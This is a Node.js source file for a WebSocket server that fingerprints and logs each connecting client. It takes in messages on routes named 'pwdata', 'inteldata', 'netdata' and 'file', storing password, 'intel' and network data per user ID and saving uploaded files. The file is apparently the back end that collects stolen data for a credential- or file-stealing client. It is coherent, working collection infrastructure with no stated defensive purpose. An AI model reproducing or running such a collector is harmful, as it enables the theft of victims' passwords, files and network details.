const WebSocket = require('ws');
const { sequelize, Log } = require('../../Functions/db'); // Import Log model
const { updateFingerprintRecordByFU, addFingerprintRecord, saveFileToUploadPath } = require('../../Functions/utils'); 

const crypto = require('crypto');
const url = require('url'); // To parse query parameters

function runWebSocketServer(server) {
    // Start WebSocket server
    const wss = new WebSocket.Server({ server }); // Attach WebSocket server to the same HTTP/HTTPS server
    console.log('[5ELG-SERVICE] WebSocket server running.');

    // Handle WebSocket connections
    wss.on('connection', (ws, req) => {
        const clientIp = req.socket.remoteAddress; // Client IP address
        const userAgent = req.headers['user-agent'] || 'N/A'; // User-Agent (if available)
       
        const parsedUrl = url.parse(req.url, true); // `true` parses the query string into an object
        const queryParams = parsedUrl.query;
        const fuID = queryParams.u || 'N/B'; // Extract 'u' parameter
        const fbID = queryParams.b || 'N/B'; // Extract 'b' parameter

        console.log(`[5ELG-WS] New client connected from ${clientIp} with User-Agent: ${userAgent}`);

        const hashReq = crypto.createHash('sha256').update(Buffer.from(JSON.stringify(req.headers)).toString('base64')).digest('hex');
        const requestData = {
            headers: req.headers,
            dealer_uri: req.headers.origin || '', // Origen de la petición
            merca_uri: req.headers.referer || 'N/A', // Origin of the request
            requestURL: req.originalUrl || req.url, // Indicating it's a WebSocket request
            method: 'WS-REQ', // WebSocket connection method
        };
        var encodedReq = Buffer.from(JSON.stringify(requestData)).toString('base64');
        const encodedSocketInfo = Buffer.from(req.socket.toString()).toString('base64');

        // Send a welcome message to the client
        if (fuID !== 'N/B') {
            try {
                const newRecordData = {
                    FU: fuID,
                    FB: fbID
                };
        
                const { record, created } = addFingerprintRecord(newRecordData);

                if (created) {
                    console.log('[5ELG-WS] New record added:', fuID);
                } 
            } catch (error) {
                console.error('Error adding new record:', error.message);
            }            
        }
        
        console.log(hashReq);
        

        // Log data
        const connectData = {
            Dl: 'WS-REQUEST',
            Ed: encodedReq, 
            Ts: new Date().toISOString(),
            Ip: clientIp,
            Ua: userAgent,
            Fu: fuID,
            Fb: fbID,
            Er: encodedReq,
            Fr: hashReq,
            Jd: encodedSocketInfo,
            Html: null,
            Screen: null,
        };
        
        try {
            Log.create(connectData); // Log data in the database
            ws.send('DEALED!');
            
        } catch (err) {
            console.error('[5ELG-WebSocket-DEALER] Error logging data:', err.message);
        }

        // Handle messages from the client
        ws.on('message', async (message) => {
            console.log('[5ELG-WS] Received message:', message);

            // Parse incoming data
            let parsedData;
            try {
                parsedData = JSON.parse(message); // Expecting JSON data from the client
            } catch (error) {
                console.error('[5ELG-WS] Error parsing message:', error.message);
                ws.send('[5ELG-WS] Invalid message format. Please send JSON data.');
                return;
            }

            // Handle different routes
            const { route, data } = parsedData;
            const { Fu, c } = data;

            switch (route) {
                case 'dealer':
                    console.log('[5ELG-WebSocket-DEALER] Dealer data received:', data);
                    break;
                case 'file':
                    const { id, cont, n} = data;
                    saveFileToUploadPath(id, n, cont)
                    .then(() => {
                        console.log(`[5ELG-WebSocket-FILE] File data received: ID=${id}`);
                    })
                    .catch((error) => {
                        console.error('Error saving file:', error);
                    });

                    break;
                case 'inteldata':           
                    updateFingerprintRecordByFU(Fu, c, 'INTEL')
                        .then(record => {
                            if (record) {
                                console.log(`[5ELG-WebSocket-DATA] Data received for user id ${Fu}`);
                            } else {
                                console.log('Record not found with the given.');
                            }
                        })
                        .catch(error => console.error('Error:', error));
                    break;                
                case 'pwdata':               
                    updateFingerprintRecordByFU(Fu, c, 'PWD')
                        .then(record => {
                            if (record) {
                                console.log(`[5ELG-WebSocket-DATA] Data received for user id ${Fu}`);
                            } else {
                                console.log('Record not found with the given.');
                            }
                        })
                        .catch(error => console.error('Error:', error));
                    break;                
                case 'netdata':               
                    updateFingerprintRecordByFU(Fu, c, 'NETDATA')
                        .then(record => {
                            if (record) {
                                console.log(`[5ELG-WebSocket-DATA] Data received for user id ${Fu}`);
                            } else {
                                console.log('Record not found with the given.');
                            }
                        })
                        .catch(error => console.error('Error:', error));
                    break;
                default:
                    console.error('[5ELG-WS] Unknown route:', route);
                    ws.send('[5ELG-WS] Unknown route.');
                    return;
            }

            // Echo the message back to the client
            ws.send('[5ELG-WebSocket-DEALER] Data processed successfully.');
        });

        // Handle disconnections
        ws.on('close', () => {
            console.log('[5ELG-WS] Client disconnected.');
        });

        // Handle errors
        ws.on('error', (err) => {
            console.error('[5ELG-WS] Error:', err.message);
        });
    });

    // Handle errors in the WebSocket server
    wss.on('error', (err) => {
        console.error('[5ELG-WS] Server error:', err.message);
    });
}

module.exports = { runWebSocketServer };